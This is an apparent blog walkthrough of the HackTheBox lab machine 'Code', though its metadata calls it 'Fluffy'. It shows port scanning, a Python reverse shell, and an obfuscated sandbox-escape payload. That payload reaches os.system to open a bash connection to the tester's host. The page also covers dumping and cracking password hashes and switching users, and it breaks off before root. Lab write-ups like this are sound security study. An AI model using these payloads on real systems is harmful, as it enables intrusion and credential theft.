<!doctype html>
<html
  lang="en-us"
  dir="ltr"
  class="h-full">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="language" content="en-us">
<script>
  
  (function () {
    const storedTheme = localStorage.getItem("theme");
    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");
    document.documentElement.setAttribute("data-theme", theme);
  })();
</script>
<title>Code | Bukhari&#39;s Archive</title>
<meta
  name="description"
  content="
    HackTheBox Fluffy machine writeup
  
  ">


  <meta name="keywords" content="HackTheBox, Active Directory, SMB, NTLM, Privilege Escalation">





<link rel="canonical" href="http://localhost:1313/machines/code/">

<meta name="robots" content="index, follow">


<meta property="og:type" content="article">
<meta property="og:title" content="Code | Bukhari&#39;s Archive">
<meta property="og:description" content="HackTheBox Fluffy machine writeup">
<meta property="og:url" content="http://localhost:1313/machines/code/">
<meta property="og:site_name" content="Bukhari&#39;s Archive"><meta property="og:image" content="http://localhost:1313/preview.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630"><meta property="article:published_time" content="2026-02-14T00:00:00Z">
  <meta
    property="article:modified_time"
    content="2026-02-14T00:00:00Z"><meta property="article:section" content="HackTheBox"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="SMB"><meta property="article:tag" content="NTLM"><meta property="article:tag" content="Privilege Escalation">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Code | Bukhari&#39;s Archive">
<meta name="twitter:description" content="HackTheBox Fluffy machine writeup"><meta name="twitter:image" content="http://localhost:1313/preview.png"><meta name="twitter:site" content="@https://x.com/B3TA_BLOCKER">
  <meta name="twitter:creator" content="@https://x.com/B3TA_BLOCKER">

<script type="application/ld+json">












"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"yourmail@example.com\",\"name\":\"Bukhari's Archive\"},\"dateModified\":\"2026-02-14T00:00:00Z\",\"datePublished\":\"2026-02-14T00:00:00Z\",\"description\":\"HackTheBox Fluffy machine writeup\",\"headline\":\"Code\",\"image\":\"http://localhost:1313/preview.png\",\"keywords\":[\"HackTheBox\",\"Active Directory\",\"SMB\",\"NTLM\",\"Privilege Escalation\"],\"mainEntityOfPage\":{\"@id\":\"http://localhost:1313/machines/code/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"/images/me.png\"},\"name\":\"Bukhari's Archive\"}}"</script>



  
  
  
  
<script type="application/ld+json">"{\"@context\":\"https://schema.org\",\"@type\":\"BreadcrumbList\",\"itemListElement\":[{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/\",\"name\":\"Bukhari's Archive\",\"position\":1},{\"@type\":\"ListItem\",\"item\":\"http://localhost:1313/machines/code/\",\"name\":\"Code\",\"position\":2}]}"</script>







<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link
  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap"
  rel="stylesheet">


<link
  rel="stylesheet"
  href="/css/theme.min.a251f6659747f13720004e758411b578202d6d8c8dd101f6d21a21fb1bb104b2.css"
  integrity="sha256-olH2ZZdH8TcgAE51hBG1eCAtbYyN0QH20hoh&#43;xuxBLI=">

<link
    rel="stylesheet"
    href="/css/syntax-dark.min.b01037e5609e6260b74d6fcdd6d5131e8dcbc4d46d6ef4bfbe5a60bdfc1a9f30.css"
    integrity="sha256-sBA35WCeYmC3TW/N1tUTHo3LxNRtbvS/vlpgvfwanzA="
    id="syntax-dark-theme"
    class="syntax-theme"><link
    rel="stylesheet"
    href="/css/syntax-light.min.9602bc2fcef52b4c62e05eae14b48ba428e114f116e993e504d83ed5a3aeda98.css"
    integrity="sha256-lgK8L871K0xi4F6uFLSLpCjhFPEW6ZPlBNg&#43;1aOu2pg="
    id="syntax-light-theme"
    class="syntax-theme"
    disabled><script>
  
  (function () {
    const storedTheme = localStorage.getItem("theme");
    const systemPrefersLight = window.matchMedia("(prefers-color-scheme: light)").matches;
    const theme = storedTheme || (systemPrefersLight ? "light" : "dark");

    const syntaxDark = document.getElementById("syntax-dark-theme");
    const syntaxLight = document.getElementById("syntax-light-theme");

    if (theme === "light") {
      if (syntaxDark) syntaxDark.disabled = true;
      if (syntaxLight) syntaxLight.disabled = false;
    } else {
      if (syntaxDark) syntaxDark.disabled = false;
      if (syntaxLight) syntaxLight.disabled = true;
    }

    
    const observer = new MutationObserver(() => {
      const currentTheme = document.documentElement.getAttribute("data-theme");
      if (currentTheme === "light") {
        if (syntaxDark) syntaxDark.disabled = true;
        if (syntaxLight) syntaxLight.disabled = false;
      } else {
        if (syntaxDark) syntaxDark.disabled = false;
        if (syntaxLight) syntaxLight.disabled = true;
      }
    });

    observer.observe(document.documentElement, {
      attributes: true,
      attributeFilter: ["data-theme"],
    });
  })();
</script>




<link
  rel="stylesheet"
  href="/css/bundle.min.d430be27649a3685c7891f7076e3e50f97bf39aabb96c243b89902f3dc6c9ead.css"
  integrity="sha256-1DC&#43;J2SaNoXHiR9wduPlD5e/Oaq7lsJDuJkC89xsnq0=">





<link rel="icon" type="image/x-icon" href="/favicon.ico">
<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">

<link rel="icon" type="image/png" href="/favicon.png">

<link rel="icon" type="image/png" sizes="32x32" href="/favicon/logo-transparent/favicon-32x32.png">

<link rel="icon" type="image/png" sizes="16x16" href="/favicon/logo-transparent/favicon-16x16.png">
<link rel="apple-touch-icon" sizes="180x180" href="/favicon/logo-transparent/apple-touch-icon.png">
<link
  rel="icon"
  type="image/png"
  sizes="192x192"
  href="/favicon/logo-transparent/android-chrome-192x192.png">
<link
  rel="icon"
  type="image/png"
  sizes="512x512"
  href="/favicon/logo-transparent/android-chrome-512x512.png">
<link rel="manifest" href="/favicon/logo-transparent/site.webmanifest">




  




  </head>
  <body class="flex flex-col min-h-screen">
    <a href="#main-content" class="skip-to-main" aria-label="Skip to main content"
      >Skip to main content</a
    >
    <header class="sticky-header">
      <div class="header-container">
        <nav class="header-nav" role="navigation" aria-label="Main navigation">
  <div class="header-content">
    <div class="header-logo">
      <a href="/" class="logo-link" aria-label="Home - Bukhari&#39;s Archive">
        Bukhari&#39;s Archive
      </a>
    </div>

    
    <button 
      id="mobile-menu-toggle" 
      class="mobile-menu-toggle" 
      aria-label="Toggle menu" 
      aria-expanded="false"
      type="button">
      <span class="hamburger-icon">
        <span class="hamburger-line"></span>
        <span class="hamburger-line"></span>
        <span class="hamburger-line"></span>
      </span>
    </button>

    <div class="header-menu">
      <ul class="menu-list">
  
    <li class="menu-item">
      <a
        href="/"
        class="menu-link ">
        Home
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/machines/"
        class="menu-link ">
        Machines
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/challenges/"
        class="menu-link ">
        Challenges
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/tags/"
        class="menu-link ">
        Tags
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/about/"
        class="menu-link ">
        About
      </a>
    </li>
  
</ul>


      <button id="search-toggle" class="search-toggle" aria-label="Search" type="button">
        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
        </svg>
      </button>

      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme" type="button">
  <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
    <path
      stroke-linecap="round"
      stroke-linejoin="round"
      stroke-width="2"
      d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
  </svg>
  <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
    <path
      stroke-linecap="round"
      stroke-linejoin="round"
      stroke-width="2"
      d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
  </svg>
</button>

    </div>
  </div>

  
  <div id="mobile-menu" class="mobile-menu" aria-hidden="true">
    <div class="mobile-menu-overlay"></div>
    <div class="mobile-menu-content">
      <div class="mobile-menu-header">
        <span class="mobile-menu-title">Menu</span>
        <button 
          id="mobile-menu-close" 
          class="mobile-menu-close" 
          aria-label="Close menu" 
          type="button">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
          </svg>
        </button>
      </div>
      <nav class="mobile-menu-nav" role="navigation" aria-label="Mobile navigation">
        <ul class="menu-list">
  
    <li class="menu-item">
      <a
        href="/"
        class="menu-link ">
        Home
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/machines/"
        class="menu-link ">
        Machines
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/challenges/"
        class="menu-link ">
        Challenges
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/tags/"
        class="menu-link ">
        Tags
      </a>
    </li>
  
    <li class="menu-item">
      <a
        href="/about/"
        class="menu-link ">
        About
      </a>
    </li>
  
</ul>

      </nav>
      <div class="mobile-menu-footer">
        <button id="mobile-search-toggle" class="mobile-search-toggle" aria-label="Search" type="button">
          <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
          </svg>
          <span>Search</span>
        </button>
        <button class="theme-toggle" aria-label="Toggle theme" type="button">
          <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
          </svg>
          <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
          </svg>
        </button>
      </div>
    </div>
  </div>
</nav>

      </div>
    </header>

    <main id="main-content" class="flex-1" role="main">
      
  <div class="single-post-wrapper">
    <article class="single-post">
      




  <div class="post-image-single">
    <img
      src="/machines/code/preview.png"
      alt="
        HackTheBox Fluffy machine writeup
      "
      loading="eager"
      width="1200"
      height="630">
  </div>




      <header class="post-header">
        <h1 class="post-title-main">Code</h1>

        
          <p class="post-description-main">HackTheBox Fluffy machine writeup</p>
        

        <div class="post-meta">
  <div class="post-meta-info">
    <time datetime="2026-02-14T00:00:00Z" class="post-date">
      <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
          d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
      </svg>
      February 14, 2026
    </time>

    <span class="meta-separator">‚Ä¢</span>

    
      <span class="post-word-count">
        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
        </svg>
        1492 words
      </span>
    

    
      <span class="meta-separator">‚Ä¢</span>
      <span class="post-reading-time">
        <svg class="meta-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
        </svg>
        8 min
      </span>
    
  </div>

  
    <div class="post-tags">
      
        <a href="/tags/hackthebox" class="post-tag">HackTheBox</a>
      
        <a href="/tags/active-directory" class="post-tag">Active Directory</a>
      
        <a href="/tags/smb" class="post-tag">SMB</a>
      
        <a href="/tags/ntlm" class="post-tag">NTLM</a>
      
        <a href="/tags/privilege-escalation" class="post-tag">Privilege Escalation</a>
      
    </div>
  
</div>

      </header>

      <div class="post-content-main">
        <h1 id="code">Code</h1>
<p><img src="Code.png" alt="Code.png"></p>
<h1 id="machine-info-">Machine info :</h1>
<p>IP address : <strong><code>10.10.11.62</code></strong></p>
<h1 id="pinging-">Pinging :</h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ ping 10.10.11.62             
</span></span><span class="line"><span class="cl">PING 10.10.11.62 <span class="o">(</span>10.10.11.62<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.11.62: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">227</span> ms
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.11.62: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">231</span> ms
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.11.62: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">159</span> ms
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">--- 10.10.11.62 ping statistics ---
</span></span><span class="line"><span class="cl"><span class="m">3</span> packets transmitted, <span class="m">3</span> received, 0% packet loss, <span class="nb">time</span> 2168ms
</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 158.708/205.593/231.151/33.197 ms
</span></span></code></pre></div><h1 id="nmap-scan-">Nmap Scan :</h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nmap -sCV  10.10.11.62
</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-08-03 11:02 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.62
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>1.1s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">5000/tcp open  http    Gunicorn 20.0.4
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn/20.0.4
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Python Code Editor
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 29.36 seconds
</span></span></code></pre></div><p>The target has two open TCP ports ‚Äî <strong><code>Port 22 for SSH</code></strong> and <strong><code>port 5000</code></strong>, which is likely hosting a <strong><code>web application</code></strong>.</p>
<h2 id="port-5000">Port 5000:</h2>
<p><img src="image.png" alt="image.png"></p>
<p>Looks like an <strong><code>online Python IDE</code></strong> ‚Äî since it shows output on the left, it might be vulnerable to code execution. I‚Äôll try injecting a Python reverse shell to see if I can pop a shell.</p>
<h1 id="exploitation-">Exploitation :</h1>
<p>I‚Äôll generate a <strong>Python reverse shell</strong> payload using <a href="https://www.revshells.com/">revshells.com</a> , then set up a <strong>listener on my device</strong> to catch the incoming connection once the payload is executed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.10.16.29&#34;</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">1234</span><span class="p">;</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span>
</span></span></code></pre></div><p><img src="image%201.png" alt="image.png"></p>
<p>The site applies <code>**filters**</code> to detect or block malicious input, so I need to <strong><code>obfuscate or modify the reverse shell code</code></strong> to bypass these filters and successfully establish a shell connection.</p>
<p>After doing some research and with the help of <strong>ChatGPT</strong>, I found a version of the reverse shell code that successfully <strong>bypasses the upload filters</strong>, and I was able to <strong>get a working shell</strong> on the target machine
Reference : <a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d">https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d</a></p>
<p><img src="image%202.png" alt="image.png"></p>
<p>Final code :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[</span><span class="n">w</span> <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">w</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;Quitter&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sy&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;sy&#39;</span><span class="o">+</span><span class="s1">&#39;stem&#39;</span><span class="p">](</span><span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.16.29/1234 0&gt;&amp;1&#34;&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p><img src="image%203.png" alt="image.png"></p>
<p>Made the shell stable</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
</span></span><span class="line"><span class="cl"><span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">1234</span>
</span></span><span class="line"><span class="cl">                                                                                                                                                              
</span></span><span class="line"><span class="cl"><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îî‚îÄ$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span> <span class="n">fg</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">1234</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span> 
</span></span></code></pre></div><p>found a database in instance directory</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span> <span class="n">ls</span> <span class="n">instance</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">database</span><span class="o">.</span><span class="n">db</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="o">/</span><span class="n">instance</span><span class="err">$</span> <span class="n">sqlite3</span> <span class="n">database</span><span class="o">.</span><span class="n">db</span> 
</span></span><span class="line"><span class="cl"><span class="n">SQLite</span> <span class="n">version</span> <span class="mf">3.31.1</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">27</span> <span class="mi">19</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">54</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="s2">&#34;.help&#34;</span> <span class="k">for</span> <span class="n">usage</span> <span class="n">hints</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">sqlite</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">tables</span>
</span></span><span class="line"><span class="cl"><span class="n">code</span>  <span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">user</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="o">|</span><span class="n">development</span><span class="o">|</span><span class="mi">759</span><span class="n">b74ce43947f5f4c91aeddc3e5bad3</span>
</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="o">|</span><span class="n">martin</span><span class="o">|</span><span class="mi">3</span><span class="n">de6f30c4a09c27fc71932bfc68474be</span>
</span></span><span class="line"><span class="cl"><span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">bash</span><span class="p">:</span> <span class="p">[</span><span class="mi">7656</span><span class="p">:</span> <span class="mi">2</span> <span class="p">(</span><span class="mi">255</span><span class="p">)]</span> <span class="n">tcsetattr</span><span class="p">:</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span> <span class="n">exit</span>
</span></span></code></pre></div><p>but here i didint needed to switch user to get to the user flag i just did the cd command there was the user.txt ie user flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~/</span><span class="n">app</span><span class="err">$</span> <span class="n">cd</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> 
</span></span><span class="line"><span class="cl"><span class="n">app</span>  <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">-</span><span class="n">production</span><span class="nd">@code</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
</span></span><span class="line"><span class="cl"><span class="mi">484</span><span class="n">db776de36eb45b9062a3d2a16b5ac</span>
</span></span></code></pre></div><h1 id="user-flag">User Flag</h1>
<p><strong><code>484db776de36eb45b9062a3d2a16b5ac</code></strong></p>
<h1 id="root-flag">Root Flag</h1>
<p>Since I don‚Äôt have permission to access the <strong><code>/root</code></strong> directory directly, my next step is to <strong>crack the hash of the user <code>martin</code></strong> .Gaining access to Martin‚Äôs account may help me escalate privileges and eventually retrieve the <strong><code>root flag</code></strong> .</p>
<p><img src="image%204.png" alt="image.png"></p>
<h2 id="hash-crack">hash crack</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ <span class="nb">echo</span> <span class="s2">&#34;3de6f30c4a09c27fc71932bfc68474be&#34;</span> &gt; hash.txt 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ john --format<span class="o">=</span>raw-md5 --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 128/128 AVX 4x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Warning: no OpenMP support <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">4</span>
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">nafeelswordsmaster <span class="o">(</span>?<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2025-08-06 04:41<span class="o">)</span> 2.564g/s 13402Kp/s 13402Kc/s 13402KC/s nafi1993..nafal1
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed.
</span></span></code></pre></div><p>password : <strong><code>nafeelswordsmaster</code></strong></p>
<p>Switched to martin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">app-production@code:/home$ su martin
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">martin@code:/home$
</span></span></code></pre></div><p>Inside Martin‚Äôs home directory, I noticed a folder named <code>root</code>, which initially seemed suspicious ‚Äî possibly hinting at access to the actual root user‚Äôs data.</p>
<p>However, after navigating into it and exploring further (~/root/scripts/backups/), it turned out to be Martin‚Äôs own directory structure, not the real /root.</p>
<p>The contents were either empty or useless from a privilege escalation standpoint, so nothing valuable was found there.</p>
